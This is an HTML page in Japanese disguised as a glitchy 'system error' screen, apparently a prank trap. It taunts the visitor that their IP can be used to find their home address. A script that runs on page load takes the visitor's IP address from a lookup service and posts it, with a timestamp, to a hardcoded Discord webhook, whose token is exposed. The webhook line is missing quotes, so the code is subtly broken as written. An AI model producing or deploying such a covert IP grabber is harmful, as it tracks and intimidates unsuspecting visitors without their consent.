<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>SYSTEM ERROR / DATA CORRUPT</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background-color: #0d0d0d;
      color: #00ff66;
      font-family: 'Consolas', 'Courier New', monospace;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    /* 背景グリッチ演出 */
    .glitch-bg {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(0,255,102,0.05) 0%, rgba(0,0,0,0.9) 100%);
      pointer-events: none;
    }

    /* 走査線風のライン */
    .scanline {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        to bottom,
        rgba(255,255,255,0),
        rgba(255,255,255,0) 50%,
        rgba(0, 0, 0, 0.4) 50%,
        rgba(0, 0, 0, 0.4)
      );
      background-size: 100% 4px;
      pointer-events: none;
    }

    /* テキストのグリッチ（バグ）アニメーション */
    .glitch {
      font-size: 2rem;
      font-weight: bold;
      text-transform: uppercase;
      position: relative;
      text-shadow: 0.05em 0 0 rgba(255,0,0,0.75),
                  -0.025em -0.05em 0 rgba(0,255,0,0.75),
                  0.025em 0.05em 0 rgba(0,0,255,0.75);
      animation: glitch 500ms infinite;
      margin-bottom: 20px;
    }

    .sub-text {
      font-size: 1.2rem;
      color: #ff3366;
      text-shadow: 0 0 8px #ff3366;
      animation: blink 0.8s infinite alternate;
    }

    @keyframes glitch {
      0% {
        text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75), -0.025em 0.05em 0 rgba(0,0,255,0.75);
      }
      14% {
        text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75), -0.025em 0.05em 0 rgba(0,0,255,0.75);
      }
      15% {
        text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75), 0.025em 0.025em 0 rgba(0,255,0,0.75), -0.05em -0.05em 0 rgba(0,0,255,0.75);
      }
      49% {
        text-shadow: -0.05em -0.025em 0 rgba(255,0,0,0.75), 0.025em 0.025em 0 rgba(0,255,0,0.75), -0.05em -0.05em 0 rgba(0,0,255,0.75);
      }
      50% {
        text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75), 0 -0.05em 0 rgba(0,0,255,0.75);
      }
      99% {
        text-shadow: 0.025em 0.05em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75), 0 -0.05em 0 rgba(0,0,255,0.75);
      }
      100% {
        text-shadow: -0.025em 0 0 rgba(255,0,0,0.75), -0.025em -0.025em 0 rgba(0,255,0,0.75), -0.025em -0.05em 0 rgba(0,0,255,0.75);
      }
    }

    @keyframes blink {
      0% { opacity: 0.2; }
      100% { opacity: 1; }
    }
  </style>
</head>
<body>

  <div class="glitch-bg"></div>
  <div class="scanline"></div>

  <div class="glitch">はいひっかったーーｗ... [レオ様です]</div>
  <div class="sub-text">IP: これで住所特定できます / LOCATION: おつ</div>

  <script>
    // 訪問者のIPアドレスを取得してDiscordに送信
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const webhookUrl = https://discord.com/api/webhooks/1539154953397075970/CkOmW2zOMnalDSwSei6nktiz2Wvq6-l-VnGzSlmgDwHjpRUFNIFL0yQdi9xQAfaW8Bc8;
        
        const payload = {
          content: `🚨 **アクセス通知**\nIPアドレス: \`${data.ip}\`\n日時: ${new Date().toLocaleString('ja-JP')}`
        };

        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })
      .catch(err => console.error(err));
  </script>

</body>
</html>
